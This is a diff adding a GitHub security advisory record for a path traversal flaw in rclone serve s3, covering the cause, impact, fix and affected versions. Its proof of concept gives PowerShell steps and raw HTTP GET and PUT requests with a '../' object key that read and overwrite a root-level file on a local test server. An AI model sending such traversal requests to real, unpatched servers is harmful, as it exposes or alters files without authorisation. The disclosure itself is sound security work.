@@ -1,0 +1,55 @@
+{
+  "id": "GHSA-8v25-v8p6-qf7v",
+  "modified": "2026-08-05T20:45:22.798080005Z",
+  "published": "2026-08-05T20:27:42Z",
+  "summary": " rclone: Path traversal in serve s3 allows reading and overwriting root-level files",
+  "details": "### Summary\n\nrclone serve s3 allows a client to read and write files at the root of the remote which would normally be inaccessible by using dot-dot path segments in the object key. It does not allow reading files outside of the root. A request such as GET /bucket/../root-secret.txt is handled as an object request for bucket \"bucket\", but rclone normalizes the backend path and reads root-secret.txt from the serve root. The same issue also allows overwriting root-level files with PUT.\n\n### Details\n\nThe affected component is rclone serve s3.\n\nRelevant source files:\n\ncmd/serve/s3/backend.go\ncmd/serve/s3/multipart.go\ncmd/serve/s3/list.go\n\nIn cmd/serve/s3/backend.go, the S3 backend builds backend paths by joining the bucket name and object key with path.Join:\n\nfp := path.Join(bucketName, objectName)\n\nThis pattern is used in object operations such as HeadObject, GetObject, PutObject, DeleteObject, and CopyObject.\n\nS3 object keys are opaque names and can legally contain dot-dot segments. However, path.Join treats the object key as a filesystem-style path and normalizes ../ segments. As a result, an object key such as ../root-secret.txt is resolved outside the selected bucket directory.\n\nFor example, when rclone serve s3 is serving a root directory that contains:\n\nroot/\n  bucket/\n  root-secret.txt\n\na raw S3 HTTP request to:\n\nGET /bucket/../root-secret.txt\n\nis parsed as a request for bucket \"bucket\" and object \"../root-secret.txt\". The backend then calculates:\n\npath.Join(\"bucket\", \"../root-secret.txt\") == \"root-secret.txt\"\n\nThis causes rclone to read root-secret.txt from the serve root instead of rejecting the request or treating ../ as part of the S3 object key.\n\nThe same behavior affects writes. A request such as:\n\nPUT /bucket/../root-secret.txt\n\noverwrites root-secret.txt in the serve root.\n\nThis is a path traversal / improper path normalization issue in the S3 serving layer. It does not escape the configured rclone serve root, but it does escape the S3 bucket namespace and can expose or modify root-level files that are not intended to be S3 objects.\n\n### PoC\n\nPoC:https://drive.google.com/file/d/1-b1ATr5Szx6iW-x_dcCDppT_aKtY8ene/view?usp=sharing\n\nTest environment:\n\nWindows 11\nrclone v1.74.3 official Windows binary\nrclone serve s3 using a local filesystem root\nNo --auth-key configured, so the server allows anonymous access as documented\n\n1. Prepare a test serve root:\n\n$base = \"$env:TEMP\\rclone-serve-s3-poc\"\n$root = \"$base\\root\"\n\nRemove-Item -Recurse -Force $base -ErrorAction SilentlyContinue\nNew-Item -ItemType Directory -Force -Path \"$root\\bucket\" | Out-Null\nSet-Content -Encoding ASCII -Path \"$root\\root-secret.txt\" -Value \"ROOT_LEVEL_SECRET_MARKER\"\n\n2. Start rclone serve s3:\n\n$rclone = \"C:\\Users\\fff20\\AppData\\Local\\Temp\\rclone-current-bin\\rclone-v1.74.3-windows-amd64\\rclone.exe\"\n\n\u0026 $rclone serve s3 $root --addr 127.0.0.1:19087 -vv --log-file \"$base\\serve-s3.log\"\n\n3. In another terminal, send a raw HTTP GET request containing a dot-dot object key:\n\n$port = 19087\n$req = \"GET /bucket/../root-secret.txt HTTP/1.1`r`nHost: 127.0.0.1:$port`r`nContent-Length: 0`r`nConnection: close`r`n`r`n\"\n\n$client = [System.Net.Sockets.TcpClient]::new(\"127.0.0.1\", $port)\n$stream = $client.GetStream()\n$bytes = [Text.Encoding]::ASCII.GetBytes($req)\n$stream.Write($bytes, 0, $bytes.Length)\n$buf = New-Object byte[] 8192\n$read = $stream.Read($buf, 0, $buf.Length)\n[Text.Encoding]::ASCII.GetString($buf, 0, $read)\n$client.Close()\n\n4. Observe that the response contains the root-level file content:\n\nHTTP/1.1 200 OK\n\nROOT_LEVEL_SECRET_MARKER\n\n5. Send a raw HTTP PUT request to overwrite the same root-level file:\n\n$body = \"OVERWRITTEN_BY_DOTDOT\"\n$req = \"PUT /bucket/../root-secret.txt HTTP/1.1`r`nHost: 127.0.0.1:$port`r`nContent-Length: $($body.Length)`r`nConnection: close`r`n`r`n$body\"\n\n$client = [System.Net.Sockets.TcpClient]::new(\"127.0.0.1\", $port)\n$stream = $client.GetStream()\n$bytes = [Text.Encoding]::ASCII.GetBytes($req)\n$stream.Write($bytes, 0, $bytes.Length)\n$buf = New-Object byte[] 8192\n$read = $stream.Read($buf, 0, $buf.Length)\n[Text.Encoding]::ASCII.GetString($buf, 0, $read)\n$client.Close()\n\n6. Confirm that the root-level file was overwritten:\n\nGet-Content \"$root\\root-secret.txt\"\n\nObserved result:\n\nOVERWRITTEN_BY_DOTDOT\n\n7. The rclone debug log shows the unsafe normalization:\n\nserve s3: GET OBJECT Bucket: bucket Object: ../root-secret.txt\nroot-secret.txt: Open: flags=O_RDONLY\n\nserve s3: CREATE OBJECT: bucket ../root-secret.txt\nroot-secret.txt: OpenFile: flags=O_RDWR|O_CREATE|O_TRUNC\n\nExpected result:\n\nrclone serve s3 should reject object keys that would normalize outside the selected bucket, or preserve S3 object keys as opaque names without allowing ../ to affect the backend path.\n\nActual result:\n\nrclone serve s3 normalizes the object key with path.Join(bucketName, objectName), allowing ../ segments in the object key to escape the bucket namespace and access root-level files under the configured serve root.\n\n### Impact\n\nThis is a path traversal / improper path normalization vulnerability in rclone serve s3.\n\nAn attacker who can send requests to an affected rclone serve s3 endpoint can use dot-dot object keys to read or overwrite files outside the selected bucket directory but still inside the configured serve root.\n\nIn deployments where rclone serve s3 exposes a root containing multiple buckets or root-level operational files, this can allow unauthorized disclosure or modification of files that are not intended to be accessible as objects in the selected bucket.\n\nThe issue is especially relevant when rclone serve s3 is run without --auth-key, because rclone documents that this configuration allows anonymous access. If authentication is configured, exploitation would require valid S3 access to the server.\n\nSuggested fix:\n\nDo not build backend paths by directly passing untrusted S3 object keys to path.Join with the bucket name.\n\nBefore accessing the backend, reject object keys containing path traversal segments that would escape the selected bucket after normalization. Alternatively, preserve object keys as opaque S3 names and encode path separators or dot-dot segments so they cannot affect backend path resolution.\n\nAffected version tested:\n\nrclone v1.74.3 official Windows binary",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/rclone/rclone",
+        "purl": "pkg:golang/github.com/rclone/rclone"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.74.4"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 1.74.3",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/08/GHSA-8v25-v8p6-qf7v/GHSA-8v25-v8p6-qf7v.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/rclone/rclone/security/advisories/GHSA-8v25-v8p6-qf7v"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rclone/rclone/commit/83d1e62aa9e0dbd10a5d7eb34c117ae997268cdf"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rclone/rclone/commit/c89b766cf417fddbe7eace40d31262ecb85bfa93"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/rclone/rclone"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/rclone/rclone/releases/tag/v1.74.4"
+    }
+  ]
+}
